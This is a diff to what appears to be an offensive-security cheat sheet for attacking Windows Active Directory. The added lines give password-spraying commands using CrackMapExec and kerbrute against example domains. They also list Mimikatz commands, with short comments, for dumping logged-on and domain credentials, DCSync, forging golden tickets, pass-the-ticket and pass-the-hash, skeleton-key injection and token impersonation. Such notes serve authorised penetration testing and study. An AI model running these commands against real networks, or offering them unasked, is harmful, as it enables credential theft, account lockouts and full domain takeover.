@@ -293,6 +293,24 @@ Foreach($user_obj in $user_result)
 You can also just use the https://github.com/LancreFI/offensive/blob/main/enumhelper.ps1 helper script for enumeration.
 Or if you want more, go for https://github.com/PowerShellMafia/PowerSploit/
 
+For password spraying with PS over LDAP: https://github.com/r00t-3xp10it/redpill/blob/main/modules/Spray-Passwords.ps1
+Detects domain users automatically and sprays a password with -Pass against them or a list of passwords from a file with -File, test
+for admins with -Admin in addition.
+
+For password spraying over SMB (slower, noisier), can be done from a Linux host: https://github.com/byt3bl33d3r/CrackMapExec
+Make sure to check the password policies first as you might otherwise lock the account, if too many attempts in a certaint time window or 
+too many failed attempts etc.
+Example: crackmapexec smb 192.168.12.34 -u userlist.txt -p 'p4ssw0rd' -d testdomain.local --continue-on-success
+First parameter is the proto, then a host in the domain, list of users, the password to spray, the domain and lastly not to stop on a match
+This will also check if the user has admin credentials automatically (will add Pwn3d! after such finding)
+
+For password spary over Ticket Granting Ticket (works on both Linux and Windows): https://github.com/ropnop/kerbrute
+Example: ./kerbrute_linux_amd64 passwordspray -d testad.local userlist.txt 4ssw0rd321
+For user enumeration
+Example: ./kerbrute_linux_amd64 userenum -d testad.local userlist.txt
+
+Or if you want to reinvent the wheel or do something different, you can use: https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html
+
 --
 
 ##Using PowerView from the above mentioned PowerSploit
@@ -457,14 +475,69 @@ bloodhound
 
 --
 
-#Still it's good to handle the basics of Mimikatz through admin powershell access:
-#Enable SeDebugPrivilege
+#Still it's good to handle the basics of Mimikatz through admin powershell access, thanks to among others:
+
+#Enable SeDebugPrivilege, required for many of the commands to be run
 privilege::debug
+
 #Dump creds of all logged-on users on the host, on older systems WDigest hashes were used and Mimikatz will automatically decrypt them, others need to
 #be cracked by other means
 sekurlsa::logonpasswords
+
 #You can also use TGT and Service Tickets, so to get the current user's ticket you'd for example to dir on a SMB share, and then spawn:
 sekurlsa::tickets
+
 #If you're lucky and the host is a CA for the domain, you can export unexportable certificates:
 crypto::capi
 crypto::cng
+
+#List or export certificates
+crypto::certificates
+
+#Create golden/silver/trust tickets
+kerberos::golden
+
+#List all user tickets (TGT and TGS) in user memory
+kerberos::list
+
+#Pass the ticket
+kerberos::ptt – Used to inject a stolen/forged Kerberos ticket
+
+#Ask a DC to synchronize an object (get password data for an account)
+lsadump::dcsync
+
+#Dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file
+#Also used to get specific credential such as krbtgt with parameter /name: "/name:krbtgt"
+lsadump::lsa
+
+#Dump credentials for local accounts
+lsadump::sam
+
+#Dump trust keys (passwords) for all associated trusts (domain/forest)
+LSADUMP::trust
+
+#Inject a malicious SSP to log locally authenticated credentials
+misc::memssp
+
+#Inject Skeleton Key into LSASS process on DC, enabling all user authentication to the Skeleton Key patched DC to use a "master password" in addition to their usual password
+misc::skeleton
+
+#List Kerberos encryption keys
+sekurlsa::ekeys
+
+#List Kerberos credentials for all authenticated users (including services and computer account)
+sekurlsa::kerberos
+
+#Get domain Kerberos service account (KRBTGT) password data
+sekurlsa::krbtgt
+
+#Pass-the-Hash and Over-Pass-the-Hash
+sekurlsa::pth
+
+#List all tokens of the system
+token::list
+
+#Impersonate a token, or in combination with /domainadmin to impersonate Domain Admin credentials. Use to elevate to SYSTEM or find a domain admin token on the target
+token::elevate 
+
+----
